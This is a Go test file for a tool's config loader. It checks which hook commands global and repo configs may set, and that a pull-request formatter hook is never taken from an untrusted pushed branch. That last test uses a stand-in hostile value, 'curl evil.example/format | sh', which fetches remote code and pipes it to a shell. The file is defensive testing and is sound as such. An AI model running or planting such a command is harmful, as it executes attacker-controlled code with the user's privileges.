package config

import (
	"strings"
	"testing"
)

func TestGlobalConfigAcceptsPRBodyHook(t *testing.T) {
	t.Parallel()
	cfg, err := LoadGlobalFromBytes([]byte("hooks:\n  pr_body: ~/scripts/format-pr\n"))
	if err != nil {
		t.Fatalf("LoadGlobalFromBytes: %v", err)
	}
	if cfg.Hooks.PRBody != "~/scripts/format-pr" {
		t.Fatalf("hooks.pr_body = %q", cfg.Hooks.PRBody)
	}
}

// post_worktree is a repo's own install command; a machine-wide one would run
// the wrong setup in every other repo on the machine.
func TestGlobalConfigRejectsPostWorktreeHook(t *testing.T) {
	t.Parallel()
	_, err := LoadGlobalFromBytes([]byte("hooks:\n  post_worktree: yarn install\n"))
	if err == nil {
		t.Fatal("expected an error")
	}
	if !strings.Contains(err.Error(), "repo-only") {
		t.Fatalf("error = %v, want it to say post_worktree is repo-only", err)
	}
}

func TestRepoPRBodyHookOverridesGlobal(t *testing.T) {
	t.Parallel()
	global, err := LoadGlobalFromBytes([]byte("hooks:\n  pr_body: global-formatter\n"))
	if err != nil {
		t.Fatalf("LoadGlobalFromBytes: %v", err)
	}
	repo, err := LoadRepoFromBytes([]byte("hooks:\n  pr_body: repo-formatter\n"))
	if err != nil {
		t.Fatalf("LoadRepoFromBytes: %v", err)
	}
	if got := Merge(global, repo).Hooks.PRBody; got != "repo-formatter" {
		t.Fatalf("hooks.pr_body = %q, want the repo override", got)
	}
}

func TestGlobalPRBodyHookAppliesWithoutRepoConfig(t *testing.T) {
	t.Parallel()
	global, err := LoadGlobalFromBytes([]byte("hooks:\n  pr_body: global-formatter\n"))
	if err != nil {
		t.Fatalf("LoadGlobalFromBytes: %v", err)
	}
	if got := Merge(global, &RepoConfig{}).Hooks.PRBody; got != "global-formatter" {
		t.Fatalf("hooks.pr_body = %q, want the global default", got)
	}
}

// The pushed branch controls nothing that executes, and a formatter runs as
// the author. It has to sit on the same side of the trust boundary as
// post_worktree.
func TestPRBodyHookIsNotSourcedFromAnUntrustedBranch(t *testing.T) {
	t.Parallel()
	trusted := &RepoConfig{Hooks: Hooks{PRBody: "trusted-formatter"}}
	pushed := &RepoConfig{Hooks: Hooks{PRBody: "curl evil.example/format | sh"}}

	got := EffectiveRepoConfig(pushed, trusted, false)
	if got.Hooks.PRBody != "trusted-formatter" {
		t.Fatalf("hooks.pr_body = %q, want the trusted value", got.Hooks.PRBody)
	}
}
